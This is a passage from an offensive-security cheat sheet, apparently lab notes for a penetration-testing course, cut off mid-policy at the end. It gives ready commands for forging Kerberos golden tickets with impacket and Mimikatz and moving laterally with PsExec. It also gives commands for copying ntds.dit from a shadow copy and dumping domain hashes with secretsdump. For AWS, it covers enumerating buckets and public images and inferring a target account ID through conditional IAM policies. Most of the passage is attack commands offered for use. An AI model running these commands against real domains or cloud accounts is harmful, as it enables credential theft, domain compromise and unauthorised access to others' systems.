</span><span id="__span-205-4"><a id="__codelineno-205-4" name="__codelineno-205-4" href="#__codelineno-205-4"></a><span class="c1">## with krbtgt aesKey - recomended</span>
</span><span id="__span-205-5"><a id="__codelineno-205-5" name="__codelineno-205-5" href="#__codelineno-205-5"></a>impacket-ticketer<span class="w"> </span>-aesKey<span class="w"> </span><span class="o">[</span>aesKey<span class="o">]</span><span class="w"> </span>-domain-sid<span class="w"> </span><span class="o">[</span>domainSID<span class="o">]</span><span class="w"> </span>-domain<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span><span class="w"> </span><span class="o">[</span>user<span class="o">]</span>
</span><span id="__span-205-6"><a id="__codelineno-205-6" name="__codelineno-205-6" href="#__codelineno-205-6"></a>
</span><span id="__span-205-7"><a id="__codelineno-205-7" name="__codelineno-205-7" href="#__codelineno-205-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=[</span>.ccache<span class="w"> </span>path<span class="o">]</span>
</span><span id="__span-205-8"><a id="__codelineno-205-8" name="__codelineno-205-8" href="#__codelineno-205-8"></a>impacket-psexec<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>hostname<span class="o">]</span><span class="w"> </span>-k<span class="w"> </span>-no-pass
</span></code></pre></div>
<p><strong><em>Windows - Mimikatz</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-206-1"><a id="__codelineno-206-1" name="__codelineno-206-1" href="#__codelineno-206-1"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-206-2"><a id="__codelineno-206-2" name="__codelineno-206-2" href="#__codelineno-206-2"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">krbtgt</span>
</span><span id="__span-206-3"><a id="__codelineno-206-3" name="__codelineno-206-3" href="#__codelineno-206-3"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">purge</span>
</span><span id="__span-206-4"><a id="__codelineno-206-4" name="__codelineno-206-4" href="#__codelineno-206-4"></a>
</span><span id="__span-206-5"><a id="__codelineno-206-5" name="__codelineno-206-5" href="#__codelineno-206-5"></a><span class="c">## Submit ticket to current session</span>
</span><span id="__span-206-6"><a id="__codelineno-206-6" name="__codelineno-206-6" href="#__codelineno-206-6"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="no">[user]</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="no">[domain]</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="no">[domainSID]</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="no">[krbtgt hash]</span> <span class="p">/</span><span class="n">ptt</span>
</span><span id="__span-206-7"><a id="__codelineno-206-7" name="__codelineno-206-7" href="#__codelineno-206-7"></a>
</span><span id="__span-206-8"><a id="__codelineno-206-8" name="__codelineno-206-8" href="#__codelineno-206-8"></a><span class="c">## Save ticket</span>
</span><span id="__span-206-9"><a id="__codelineno-206-9" name="__codelineno-206-9" href="#__codelineno-206-9"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="no">[user]</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="no">[domain]</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="no">[domainSID]</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="no">[krbtgt hash]</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">golden</span><span class="p">.</span><span class="n">kirbi</span>
</span><span id="__span-206-10"><a id="__codelineno-206-10" name="__codelineno-206-10" href="#__codelineno-206-10"></a>
</span><span id="__span-206-11"><a id="__codelineno-206-11" name="__codelineno-206-11" href="#__codelineno-206-11"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">goldem</span><span class="p">.</span><span class="n">kirbi</span>
</span><span id="__span-206-12"><a id="__codelineno-206-12" name="__codelineno-206-12" href="#__codelineno-206-12"></a>
</span><span id="__span-206-13"><a id="__codelineno-206-13" name="__codelineno-206-13" href="#__codelineno-206-13"></a><span class="c">## Ticket in use</span>
</span><span id="__span-206-14"><a id="__codelineno-206-14" name="__codelineno-206-14" href="#__codelineno-206-14"></a><span class="p">.\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\</span><span class="no">[hostname]</span> <span class="n">cmd</span>
</span></code></pre></div>
<p><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html">Golden Ticket - HackTricks</a></p>
<h4 id="shadow-copies"><strong>Shadow Copies</strong></h4>
<aside>


To manage volume shadow copies, the Microsoft signed binary [*vshadow.exe*](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample)
is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).

</aside>

<p><strong><em>Store the copy on disk</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-207-1"><a id="__codelineno-207-1" name="__codelineno-207-1" href="#__codelineno-207-1"></a><span class="n">vshadow</span><span class="p">.</span><span class="n">exe</span> <span class="n">-nw</span> <span class="n">-p</span>  <span class="n">C</span><span class="p">:</span>
</span><span id="__span-207-2"><a id="__codelineno-207-2" name="__codelineno-207-2" href="#__codelineno-207-2"></a>
</span><span id="__span-207-3"><a id="__codelineno-207-3" name="__codelineno-207-3" href="#__codelineno-207-3"></a><span class="nb">copy </span><span class="p">\\?\</span><span class="n">GLOBALROOT</span><span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolumeShadowCopy2</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">c</span><span class="p">:\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span><span class="p">.</span><span class="n">bak</span>
</span></code></pre></div>
<p><strong><em>Save the SYSTEM hive from the Windows registry</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-208-1"><a id="__codelineno-208-1" name="__codelineno-208-1" href="#__codelineno-208-1"></a><span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">c</span><span class="p">:\</span><span class="n">system</span><span class="p">.</span><span class="n">bak</span>
</span></code></pre></div>
<p><strong><em>Extract ntds database locally</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-209-1"><a id="__codelineno-209-1" name="__codelineno-209-1" href="#__codelineno-209-1"></a><span class="n">impacket-secretsdump</span> <span class="n">-ntds</span> <span class="n">ntds</span><span class="p">.</span><span class="n">dit</span><span class="p">.</span><span class="n">bak</span> <span class="n">-system</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">LOCAL</span>
</span></code></pre></div>
<h2 id="enumerating-aws-cloud-infrastructure"><strong>Enumerating AWS Cloud Infrastructure</strong></h2>
<h3 id="reconnaissance-of-cloud-resources-on-the-internet"><strong>Reconnaissance of Cloud Resources on the Internet</strong></h3>
<h4 id="domain-and-subdomain-reconnaissance"><strong>Domain and Subdomain Reconnaissance</strong></h4>
<aside>


The EC2 instance is a virtual machine in the AWS cloud. EC2 is a common service used to host websites, applications, and other services that require a server.

</aside>

<p><strong><em>Enumerate DNS</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-210-1"><a id="__codelineno-210-1" name="__codelineno-210-1" href="#__codelineno-210-1"></a>dnsenum<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span><span class="w"> </span>--threads<span class="w"> </span><span class="m">100</span>
</span></code></pre></div>
<h4 id="service-specific-domains">Service-specific Domains</h4>
<p><strong><em>Wordlist</em></strong> - <code>/usr/lib/cloud-enum/enum_tools/fuzz.txt</code></p>
<p><strong><em>Enumerate Buckets using cloud_enum</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-211-1"><a id="__codelineno-211-1" name="__codelineno-211-1" href="#__codelineno-211-1"></a>cloud_enum<span class="w"> </span>-k<span class="w"> </span><span class="o">[</span>bucket<span class="o">]</span><span class="w"> </span>--quickscan<span class="w"> </span>--disable-azure<span class="w"> </span>--disable-gcp
</span><span id="__span-211-2"><a id="__codelineno-211-2" name="__codelineno-211-2" href="#__codelineno-211-2"></a>cloud_enum<span class="w"> </span>-kf<span class="w"> </span><span class="o">[</span>bucket<span class="w"> </span>wordlist<span class="o">]</span><span class="w"> </span>--quickscan<span class="w"> </span>--disable-azure<span class="w"> </span>--disable-gcp
</span><span id="__span-211-3"><a id="__codelineno-211-3" name="__codelineno-211-3" href="#__codelineno-211-3"></a>
</span><span id="__span-211-4"><a id="__codelineno-211-4" name="__codelineno-211-4" href="#__codelineno-211-4"></a><span class="c1">## example</span>
</span><span id="__span-211-5"><a id="__codelineno-211-5" name="__codelineno-211-5" href="#__codelineno-211-5"></a>cloud_enum<span class="w"> </span>-k<span class="w"> </span>offseclab-assets-public-axevtewi<span class="w"> </span>--quickscan<span class="w"> </span>--disable-azure<span class="w"> </span>--disable-gcp
</span><span id="__span-211-6"><a id="__codelineno-211-6" name="__codelineno-211-6" href="#__codelineno-211-6"></a>
</span><span id="__span-211-7"><a id="__codelineno-211-7" name="__codelineno-211-7" href="#__codelineno-211-7"></a>cloud_enum<span class="w"> </span>-kf<span class="w"> </span>keyfile.txt<span class="w"> </span>--quickscan<span class="w"> </span>--disable-azure<span class="w"> </span>--disable-gcp
</span></code></pre></div>
<h3 id="reconnaissance-via-cloud-service-providers-api"><strong>Reconnaissance via Cloud Service Provider's API</strong></h3>
<h4 id="configure-aws-cli"><strong>Configure AWS CLI</strong></h4>
<p><strong><em>Create AWS Profile</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-212-1"><a id="__codelineno-212-1" name="__codelineno-212-1" href="#__codelineno-212-1"></a>aws<span class="w"> </span>configure<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>AnyName<span class="o">]</span>
</span><span id="__span-212-2"><a id="__codelineno-212-2" name="__codelineno-212-2" href="#__codelineno-212-2"></a>
</span><span id="__span-212-3"><a id="__codelineno-212-3" name="__codelineno-212-3" href="#__codelineno-212-3"></a>aws<span class="w"> </span>configure<span class="w"> </span>list-profiles
</span></code></pre></div>
<p><strong><em>Interact with AWS Profile</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-213-1"><a id="__codelineno-213-1" name="__codelineno-213-1" href="#__codelineno-213-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>CreatedProfile<span class="o">]</span><span class="w"> </span><span class="o">[</span>command<span class="o">]</span>
</span><span id="__span-213-2"><a id="__codelineno-213-2" name="__codelineno-213-2" href="#__codelineno-213-2"></a>
</span><span id="__span-213-3"><a id="__codelineno-213-3" name="__codelineno-213-3" href="#__codelineno-213-3"></a><span class="c1">## example</span>
</span><span id="__span-213-4"><a id="__codelineno-213-4" name="__codelineno-213-4" href="#__codelineno-213-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>CreatedProfile<span class="o">]</span><span class="w"> </span>sts<span class="w"> </span>get-caller-identity
</span><span id="__span-213-5"><a id="__codelineno-213-5" name="__codelineno-213-5" href="#__codelineno-213-5"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>CreatedProfile<span class="o">]</span><span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>
</span><span id="__span-213-6"><a id="__codelineno-213-6" name="__codelineno-213-6" href="#__codelineno-213-6"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>CreatedProfile<span class="o">]</span><span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://<span class="o">[</span>bucker<span class="o">]</span><span class="w"> </span>--recursive
</span></code></pre></div>
<h4 id="publicly-shared-resources"><strong>Publicly Shared Resources</strong></h4>
<p><strong><em>Get Publicly Available Images</em></strong></p>
<ul>
<li><strong>ec2 describe-images -</strong> list all the images that the account can read</li>
<li><strong>owners amazon -</strong> filter this list and show only AMIs provided by AWS</li>
<li><strong>executable-users all</strong> - ensure that all public AMIs will be listed</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-214-1"><a id="__codelineno-214-1" name="__codelineno-214-1" href="#__codelineno-214-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>ec2<span class="w"> </span>describe-images<span class="w"> </span>--owners<span class="w"> </span>amazon<span class="w"> </span>--executable-users<span class="w"> </span>all
</span></code></pre></div>
<p><strong><em>Get Publicly Available Images Owend by Other User</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-215-1"><a id="__codelineno-215-1" name="__codelineno-215-1" href="#__codelineno-215-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>ec2<span class="w"> </span>describe-images<span class="w"> </span>--executable-users<span class="w"> </span>all<span class="w"> </span>--filters<span class="w"> </span><span class="s2">&quot;Name=description,Values=*Domain*&quot;</span>
</span><span id="__span-215-2"><a id="__codelineno-215-2" name="__codelineno-215-2" href="#__codelineno-215-2"></a>
</span><span id="__span-215-3"><a id="__codelineno-215-3" name="__codelineno-215-3" href="#__codelineno-215-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>ec2<span class="w"> </span>describe-images<span class="w"> </span>--executable-users<span class="w"> </span>all<span class="w"> </span>--filters<span class="w"> </span><span class="s2">&quot;Name=name,Values=*Domain*&quot;</span>
</span></code></pre></div>
<p><strong><em>Get Publicly Available Snapshots</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-216-1"><a id="__codelineno-216-1" name="__codelineno-216-1" href="#__codelineno-216-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>ec2<span class="w"> </span>describe-snapshots<span class="w"> </span>
</span><span id="__span-216-2"><a id="__codelineno-216-2" name="__codelineno-216-2" href="#__codelineno-216-2"></a>
</span><span id="__span-216-3"><a id="__codelineno-216-3" name="__codelineno-216-3" href="#__codelineno-216-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>ec2<span class="w"> </span>describe-snapshots<span class="w"> </span>--filters<span class="w"> </span><span class="s2">&quot;Name=description,Values=*Domain*&quot;</span>
</span><span id="__span-216-4"><a id="__codelineno-216-4" name="__codelineno-216-4" href="#__codelineno-216-4"></a>
</span><span id="__span-216-5"><a id="__codelineno-216-5" name="__codelineno-216-5" href="#__codelineno-216-5"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>ec2<span class="w"> </span>describe-snapshots<span class="w"> </span>--filters<span class="w"> </span><span class="s2">&quot;Name=name,Values=*Domain*&quot;</span>
</span></code></pre></div>
<h4 id="obtaining-account-ids-from-s3-buckets"><strong>Obtaining Account IDs from S3 Buckets</strong></h4>
<p>First, we'll choose a publicly readable bucket or object inside the target account. Because the bucket/object is publicly readable, we should be able to list the content of it with any IAM user of any AWS account. In the lab, we'll choose one of the publicly readable buckets.</p>
<p>Then, we'll create a new IAM user in our <em>attacker</em> account. By default, IAM users don't have any permissions to execute any actions, so the new user won't be able to list the content of the public resource even when it's public.</p>
<p>Next, we'll create a policy that will grant permissions to <em>list buckets</em> and <em>read objects</em>. However, we'll add the <em>Condition</em> that the <em>read</em> permission will only apply if the account ID that owns the bucket starts with the digit "x".</p>
<p>After we apply the policy to the new IAM user, we'll test if we can list the bucket with the new user's credentials. We'll test the value <em>x</em> from 0 to 9 until we can list the bucket, meaning that we found the first digit of the account.</p>
<p>Check the public resource</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-217-1"><a id="__codelineno-217-1" name="__codelineno-217-1" href="#__codelineno-217-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span><span class="o">[</span>public<span class="w"> </span>bucket<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>Create new AIM user and assign KEYs</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-218-1"><a id="__codelineno-218-1" name="__codelineno-218-1" href="#__codelineno-218-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>attacker<span class="w"> </span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>create-user<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>username<span class="o">]</span>
</span><span id="__span-218-2"><a id="__codelineno-218-2" name="__codelineno-218-2" href="#__codelineno-218-2"></a>
</span><span id="__span-218-3"><a id="__codelineno-218-3" name="__codelineno-218-3" href="#__codelineno-218-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>attacker<span class="w"> </span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>create-access-key<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>username<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>Configure Profile for Newly created IAM User</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-219-1"><a id="__codelineno-219-1" name="__codelineno-219-1" href="#__codelineno-219-1"></a>aws<span class="w"> </span>configure<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>created<span class="w"> </span>IAM<span class="w"> </span>user<span class="o">]</span>
</span><span id="__span-219-2"><a id="__codelineno-219-2" name="__codelineno-219-2" href="#__codelineno-219-2"></a>
</span><span id="__span-219-3"><a id="__codelineno-219-3" name="__codelineno-219-3" href="#__codelineno-219-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>created<span class="w"> </span>IAM<span class="w"> </span>user<span class="o">]</span><span class="w"> </span>sts<span class="w"> </span>get-caller-identity
</span></code></pre></div>
<p><strong><em>Check access to Private Bucket</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-220-1"><a id="__codelineno-220-1" name="__codelineno-220-1" href="#__codelineno-220-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span><span class="o">[</span>bucket<span class="o">]</span>
</span><span id="__span-220-2"><a id="__codelineno-220-2" name="__codelineno-220-2" href="#__codelineno-220-2"></a>
</span><span id="__span-220-3"><a id="__codelineno-220-3" name="__codelineno-220-3" href="#__codelineno-220-3"></a><span class="c1">## example</span>
</span><span id="__span-220-4"><a id="__codelineno-220-4" name="__codelineno-220-4" href="#__codelineno-220-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span>enum<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>offseclab-assets-private-kaykoour
</span></code></pre></div>
<p><strong><em>Create a policy that will allow for listing the content of the bucket and reading objects inside it - Condition = if AccountID starts with X</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-221-1"><a id="__codelineno-221-1" name="__codelineno-221-1" href="#__codelineno-221-1"></a><span class="o">{</span>
</span><span id="__span-221-2"><a id="__codelineno-221-2" name="__codelineno-221-2" href="#__codelineno-221-2"></a><span class="w">    </span><span class="s2">&quot;Version&quot;</span>:<span class="w"> </span><span class="s2">&quot;2012-10-17&quot;</span>,
</span><span id="__span-221-3"><a id="__codelineno-221-3" name="__codelineno-221-3" href="#__codelineno-221-3"></a><span class="w">    </span><span class="s2">&quot;Statement&quot;</span>:<span class="w"> </span><span class="o">[</span>
</span><span id="__span-221-4"><a id="__codelineno-221-4" name="__codelineno-221-4" href="#__codelineno-221-4"></a><span class="w">        </span><span class="o">{</span>
</span><span id="__span-221-5"><a id="__codelineno-221-5" name="__codelineno-221-5" href="#__codelineno-221-5"></a><span class="w">            </span><span class="s2">&quot;Sid&quot;</span>:<span class="w"> </span><span class="s2">&quot;AllowResourceAccount&quot;</span>,
</span><span id="__span-221-6"><a id="__codelineno-221-6" name="__codelineno-221-6" href="#__codelineno-221-6"></a><span class="w">            </span><span class="s2">&quot;Effect&quot;</span>:<span class="w"> </span><span class="s2">&quot;Allow&quot;</span>,
</span><span id="__span-221-7"><a id="__codelineno-221-7" name="__codelineno-221-7" href="#__codelineno-221-7"></a><span class="w">            </span><span class="s2">&quot;Action&quot;</span>:<span class="w"> </span><span class="o">[</span>
</span><span id="__span-221-8"><a id="__codelineno-221-8" name="__codelineno-221-8" href="#__codelineno-221-8"></a><span class="w">                </span><span class="s2">&quot;s3:ListBucket&quot;</span>,
</span><span id="__span-221-9"><a id="__codelineno-221-9" name="__codelineno-221-9" href="#__codelineno-221-9"></a><span class="w">                </span><span class="s2">&quot;s3:GetObject&quot;</span>
</span><span id="__span-221-10"><a id="__codelineno-221-10" name="__codelineno-221-10" href="#__codelineno-221-10"></a><span class="w">            </span><span class="o">]</span>,
</span><span id="__span-221-11"><a id="__codelineno-221-11" name="__codelineno-221-11" href="#__codelineno-221-11"></a><span class="w">            </span><span class="s2">&quot;Resource&quot;</span>:<span class="w"> </span><span class="s2">&quot;*&quot;</span>,
</span><span id="__span-221-12"><a id="__codelineno-221-12" name="__codelineno-221-12" href="#__codelineno-221-12"></a><span class="w">            </span><span class="s2">&quot;Condition&quot;</span>:<span class="w"> </span><span class="o">{</span>
</span><span id="__span-221-13"><a id="__codelineno-221-13" name="__codelineno-221-13" href="#__codelineno-221-13"></a><span class="w">                </span><span class="s2">&quot;StringLike&quot;</span>:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;s3:ResourceAccount&quot;</span>:<span class="w"> </span><span class="o">[</span><span class="s2">&quot;0*&quot;</span><span class="o">]}</span>
</span><span id="__span-221-14"><a id="__codelineno-221-14" name="__codelineno-221-14" href="#__codelineno-221-14"></a><span class="w">            </span><span class="o">}</span>
</span><span id="__span-221-15"><a id="__codelineno-221-15" name="__codelineno-221-15" href="#__codelineno-221-15"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-221-16"><a id="__codelineno-221-16" name="__codelineno-221-16" href="#__codelineno-221-16"></a><span class="w">    </span><span class="o">]</span>
</span><span id="__span-221-17"><a id="__codelineno-221-17" name="__codelineno-221-17" href="#__codelineno-221-17"></a><span class="o">}</span>
</span></code></pre></div>
<p><strong><em>Assign Policy to Created IAM User</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-222-1"><a id="__codelineno-222-1" name="__codelineno-222-1" href="#__codelineno-222-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>attacker<span class="w"> </span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>put-user-policy<span class="w"> </span><span class="se">\</span>
</span><span id="__span-222-2"><a id="__codelineno-222-2" name="__codelineno-222-2" href="#__codelineno-222-2"></a>--user-name<span class="w"> </span><span class="o">[</span>created<span class="w"> </span>IAM<span class="w"> </span>user<span class="o">]</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-222-3"><a id="__codelineno-222-3" name="__codelineno-222-3" href="#__codelineno-222-3"></a>--policy-name<span class="w"> </span><span class="o">[</span>Policy<span class="w"> </span>Name<span class="o">]</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-222-4"><a id="__codelineno-222-4" name="__codelineno-222-4" href="#__codelineno-222-4"></a>--policy-document<span class="w"> </span>file://<span class="o">[</span>filename<span class="o">]</span>
</span><span id="__span-222-5"><a id="__codelineno-222-5" name="__codelineno-222-5" href="#__codelineno-222-5"></a>
</span><span id="__span-222-6"><a id="__codelineno-222-6" name="__codelineno-222-6" href="#__codelineno-222-6"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>attacker<span class="w"> </span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>list-user-policies<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>created<span class="w"> </span>IAM<span class="w"> </span>user<span class="o">]</span>
</span><span id="__span-222-7"><a id="__codelineno-222-7" name="__codelineno-222-7" href="#__codelineno-222-7"></a>
</span><span id="__span-222-8"><a id="__codelineno-222-8" name="__codelineno-222-8" href="#__codelineno-222-8"></a><span class="c1">## Example</span>
</span><span id="__span-222-9"><a id="__codelineno-222-9" name="__codelineno-222-9" href="#__codelineno-222-9"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>iam<span class="w"> </span>put-user-policy<span class="w"> </span><span class="se">\</span>
</span><span id="__span-222-10"><a id="__codelineno-222-10" name="__codelineno-222-10" href="#__codelineno-222-10"></a>--user-name<span class="w"> </span>enum<span class="w"> </span><span class="se">\</span>
</span><span id="__span-222-11"><a id="__codelineno-222-11" name="__codelineno-222-11" href="#__codelineno-222-11"></a>--policy-name<span class="w"> </span>s3-read<span class="w"> </span><span class="se">\</span>
</span><span id="__span-222-12"><a id="__codelineno-222-12" name="__codelineno-222-12" href="#__codelineno-222-12"></a>--policy-document<span class="w"> </span>file://policy-s3-read.json
</span><span id="__span-222-13"><a id="__codelineno-222-13" name="__codelineno-222-13" href="#__codelineno-222-13"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>iam<span class="w"> </span>list-user-policies<span class="w"> </span>--user-name<span class="w"> </span>enum
</span></code></pre></div>
<p><strong><em>Check the access with defined conditions using created IAM user</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-223-1"><a id="__codelineno-223-1" name="__codelineno-223-1" href="#__codelineno-223-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>created<span class="w"> </span>IAM<span class="w"> </span>user<span class="o">]</span><span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span><span class="o">[</span>bucket<span class="o">]</span>
</span><span id="__span-223-2"><a id="__codelineno-223-2" name="__codelineno-223-2" href="#__codelineno-223-2"></a>
</span><span id="__span-223-3"><a id="__codelineno-223-3" name="__codelineno-223-3" href="#__codelineno-223-3"></a><span class="c1">## example</span>
</span><span id="__span-223-4"><a id="__codelineno-223-4" name="__codelineno-223-4" href="#__codelineno-223-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span>enum<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>offseclab-assets-private-kaykoour
</span></code></pre></div>
<p><strong><em>Once we know that the policy starts with a digit, we can move to the next one by modifying the condition of the policy like so:</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-224-1"><a id="__codelineno-224-1" name="__codelineno-224-1" href="#__codelineno-224-1"></a>-<span class="w"> </span>__<span class="s2">&quot;StringLike&quot;</span>:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;s3:ResourceAccount&quot;</span>:<span class="w"> </span><span class="o">[</span><span class="s2">&quot;10*&quot;</span><span class="o">]}</span>__
</span><span id="__span-224-2"><a id="__codelineno-224-2" name="__codelineno-224-2" href="#__codelineno-224-2"></a>-<span class="w"> </span>__<span class="s2">&quot;StringLike&quot;</span>:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;s3:ResourceAccount&quot;</span>:<span class="w"> </span><span class="o">[</span><span class="s2">&quot;11*&quot;</span><span class="o">]}</span>__
</span><span id="__span-224-3"><a id="__codelineno-224-3" name="__codelineno-224-3" href="#__codelineno-224-3"></a>...
</span><span id="__span-224-4"><a id="__codelineno-224-4" name="__codelineno-224-4" href="#__codelineno-224-4"></a>-<span class="w"> </span>__<span class="s2">&quot;StringLike&quot;</span>:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;s3:ResourceAccount&quot;</span>:<span class="w"> </span><span class="o">[</span><span class="s2">&quot;18*&quot;</span><span class="o">]}</span>__
</span><span id="__span-224-5"><a id="__codelineno-224-5" name="__codelineno-224-5" href="#__codelineno-224-5"></a>-<span class="w"> </span>__<span class="s2">&quot;StringLike&quot;</span>:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;s3:ResourceAccount&quot;</span>:<span class="w"> </span><span class="o">[</span><span class="s2">&quot;19*&quot;</span><span class="o">]}</span>__
</span></code></pre></div>
<p><strong><em>Automated Tool</em></strong></p>
<p><a href="https://github.com/WeAreCloudar/s3-account-search?tab=readme-ov-file">GitHub - WeAreCloudar/s3-account-search: S3 Account Search</a></p>
<h4 id="enumerating-iam-users-in-other-accounts"><strong>Enumerating IAM Users in Other Accounts</strong></h4>
<p><strong><em>Create an S3 bucket inside our attacker's account</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-225-1"><a id="__codelineno-225-1" name="__codelineno-225-1" href="#__codelineno-225-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>attacker<span class="w"> </span>profile<span class="o">]</span><span class="w"> </span>s3<span class="w"> </span>mb<span class="w"> </span>s3://offseclab-dummy-bucket-<span class="nv">$RANDOM</span>-<span class="nv">$RANDOM</span>-<span class="nv">$RANDOM</span>
</span></code></pre></div>
<p><strong><em>Create policy that apply exist / nonexist users - Change Resource and Principal</em></strong></p>
<div class="language-json highlight"><pre><span></span><code><span id="__span-226-1"><a id="__codelineno-226-1" name="__codelineno-226-1" href="#__codelineno-226-1"></a><span class="p">{</span>
</span><span id="__span-226-2"><a id="__codelineno-226-2" name="__codelineno-226-2" href="#__codelineno-226-2"></a><span class="w">    </span><span class="nt">&quot;Version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2012-10-17&quot;</span><span class="p">,</span>
